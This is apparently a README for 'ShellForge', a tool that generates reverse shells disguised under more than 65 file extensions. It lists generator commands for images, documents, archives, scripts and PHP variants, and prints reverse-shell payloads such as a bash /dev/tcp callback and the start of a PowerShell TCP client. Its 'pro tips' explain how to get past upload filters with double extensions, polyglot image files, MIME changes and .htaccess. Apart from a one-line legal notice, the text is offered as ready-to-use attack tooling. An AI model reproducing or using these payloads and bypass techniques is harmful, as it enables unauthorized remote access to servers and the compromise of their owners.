# ShellForge - Complete Extension List

## 🎯 ALL 65+ SUPPORTED EXTENSIONS

ShellForge now supports **65+ file extensions** including images, documents, archives, and more!

## 📋 Extension Categories

### 🖼️ Image Formats (8 extensions)
Perfect for bypassing upload filters that only allow images:

```bash
./shellforge.py 192.168.1.100 4444 png
./shellforge.py 192.168.1.100 4444 jpg
./shellforge.py 192.168.1.100 4444 jpeg
./shellforge.py 192.168.1.100 4444 gif
./shellforge.py 192.168.1.100 4444 bmp
./shellforge.py 192.168.1.100 4444 svg
./shellforge.py 192.168.1.100 4444 ico
./shellforge.py 192.168.1.100 4444 webp
```

**Note:** These contain PHP reverse shells. Rename them back to `.php` or use double extensions like `shell.php.png`

### 📄 Document Formats (12 extensions)
For bypassing document-only upload restrictions:

```bash
./shellforge.py 192.168.1.100 4444 pdf
./shellforge.py 192.168.1.100 4444 doc
./shellforge.py 192.168.1.100 4444 docx
./shellforge.py 192.168.1.100 4444 xls
./shellforge.py 192.168.1.100 4444 xlsx
./shellforge.py 192.168.1.100 4444 ppt
./shellforge.py 192.168.1.100 4444 pptx
./shellforge.py 192.168.1.100 4444 odt
./shellforge.py 192.168.1.100 4444 ods
./shellforge.py 192.168.1.100 4444 odp
./shellforge.py 192.168.1.100 4444 txt
./shellforge.py 192.168.1.100 4444 rtf
```

### 📦 Archive Formats (6 extensions)
Embedded shells in archive files:

```bash
./shellforge.py 192.168.1.100 4444 zip
./shellforge.py 192.168.1.100 4444 rar
./shellforge.py 192.168.1.100 4444 tar
./shellforge.py 192.168.1.100 4444 gz
./shellforge.py 192.168.1.100 4444 7z
./shellforge.py 192.168.1.100 4444 bz2
```

### 💻 Programming Languages (6 extensions)
Native reverse shells in various languages:

**Python:**
```bash
./shellforge.py 192.168.1.100 4444 py
# Output: import socket,subprocess,os;s=socket.socket...
```

**Ruby:**
```bash
./shellforge.py 192.168.1.100 4444 rb
# Output: require "socket";exit if fork;c=TCPSocket.new...
```

**Perl:**
```bash
./shellforge.py 192.168.1.100 4444 pl
# Output: use Socket;$i="192.168.1.100";$p=4444...
```

**JavaScript (Node.js):**
```bash
./shellforge.py 192.168.1.100 4444 js
# Output: require("child_process").exec("/bin/bash -c \'bash -i...
```

**Go:**
```bash
./shellforge.py 192.168.1.100 4444 go
# Output: package main;import("os/exec";"net")...
```

**Java:**
```bash
./shellforge.py 192.168.1.100 4444 java
# Output: import java.io.*;import java.net.*;public class Shell...
```

### 🐚 Shell Scripts (6 extensions)
Direct shell reverse connections:

```bash
./shellforge.py 192.168.1.100 4444 sh
./shellforge.py 192.168.1.100 4444 bash
./shellforge.py 192.168.1.100 4444 zsh
./shellforge.py 192.168.1.100 4444 ksh
./shellforge.py 192.168.1.100 4444 csh
./shellforge.py 192.168.1.100 4444 fish
```

**Example Output (bash):**
```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

### 🪟 Windows Formats (7 extensions)
PowerShell-based reverse shells:

```bash
./shellforge.py 192.168.1.100 4444 bat
./shellforge.py 192.168.1.100 4444 cmd
./shellforge.py 192.168.1.100 4444 ps1
./shellforge.py 192.168.1.100 4444 vbs
./shellforge.py 192.168.1.100 4444 exe
./shellforge.py 192.168.1.100 4444 dll
```

**PowerShell reverse shell example:**
```powershell
$client=New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444);
$stream=$client.GetStream();
# ... full reverse shell code
```

### 🌐 Web Server Formats (3 extensions)
Original web shells:

```bash
./shellforge.py 192.168.1.100 4444 php
./shellforge.py 192.168.1.100 4444 asp
./shellforge.py 192.168.1.100 4444 jsp
```

### 🐘 PHP Variants (8 extensions)
All PHP file extensions for bypassing filters:

```bash
./shellforge.py 192.168.1.100 4444 php3
./shellforge.py 192.168.1.100 4444 php4
./shellforge.py 192.168.1.100 4444 php5
./shellforge.py 192.168.1.100 4444 php7
./shellforge.py 192.168.1.100 4444 phtml
./shellforge.py 192.168.1.100 4444 phps
./shellforge.py 192.168.1.100 4444 phar
```

### ⚙️ Configuration & Data Formats (9 extensions)

```bash
./shellforge.py 192.168.1.100 4444 htaccess
./shellforge.py 192.168.1.100 4444 config
./shellforge.py 192.168.1.100 4444 xml
./shellforge.py 192.168.1.100 4444 json
./shellforge.py 192.168.1.100 4444 csv
./shellforge.py 192.168.1.100 4444 sql
./shellforge.py 192.168.1.100 4444 html
./shellforge.py 192.168.1.100 4444 htm
./shellforge.py 192.168.1.100 4444 shtml
```

### 📱 Mobile Formats (2 extensions)

```bash
./shellforge.py 192.168.1.100 4444 apk
./shellforge.py 192.168.1.100 4444 ipa
```

## 🎨 Use Cases by Extension

### Image Upload Bypass
When a site only allows image uploads:
```bash
# Upload as image, then access with double extension or .htaccess
./shellforge.py 192.168.1.100 4444 png --output image.png
# Then rename or use: image.php.png
```

### Document Upload Bypass
For document management systems:
```bash
./shellforge.py 192.168.1.100 4444 pdf --output report.pdf
./shellforge.py 192.168.1.100 4444 docx --output document.docx
```

### Script Execution
When you can execute scripts:
```bash
# Linux
./shellforge.py 192.168.1.100 4444 sh
./shellforge.py 192.168.1.100 4444 py

# Windows
./shellforge.py 192.168.1.100 4444 bat
./shellforge.py 192.168.1.100 4444 ps1
```

### Web Server Shells
Standard web shells:
```bash
./shellforge.py 192.168.1.100 4444 php
./shellforge.py 192.168.1.100 4444 asp
./shellforge.py 192.168.1.100 4444 jsp
```

## 💡 Pro Tips

1. **Double Extensions:** Use `shell.php.png` for upload bypass
2. **Content-Type Bypass:** Upload PNG with PHP code, change MIME type
3. **Archive Extraction:** Hide shell in archive, extract on server
4. **Polyglot Files:** Combine image header + PHP code
5. **Configuration Files:** .htaccess can enable PHP in other extensions

## 🔥 Advanced Examples

### Polyglot Image Shell
```bash
# Create PNG with embedded PHP
./shellforge.py 192.168.1.100 4444 png --output image.png
# Add PNG header manually:
echo -e '\x89PNG\r\n\x1a\n' > final.png
cat image.png >> final.png
```

### Archive with Shell
```bash
# Create shell
./shellforge.py 192.168.1.100 4444 php --output shell.php
# Add to archive
zip package.zip shell.php
# Upload and extract
```

### Multiple Extensions Testing
```bash
# Test all PHP variants
for ext in php php3 php4 php5 phtml; do
  ./shellforge.py 192.168.1.100 4444 $ext --output shell.$ext
done
```

## 📊 Statistics

- **Total Extensions:** 65+
- **Web Formats:** 11
- **Image Formats:** 8
- **Document Formats:** 12
- **Programming Languages:** 6
- **Shell Scripts:** 6
- **Windows Formats:** 7
- **Archive Formats:** 6
- **Mobile Formats:** 2
- **Config/Data Formats:** 9

## ⚠️ Legal Notice

All extensions are for **AUTHORIZED TESTING ONLY**. Ensure you have explicit permission before using these shells on any system.

---

**ShellForge** - Every extension you need, all in one tool! 🚀
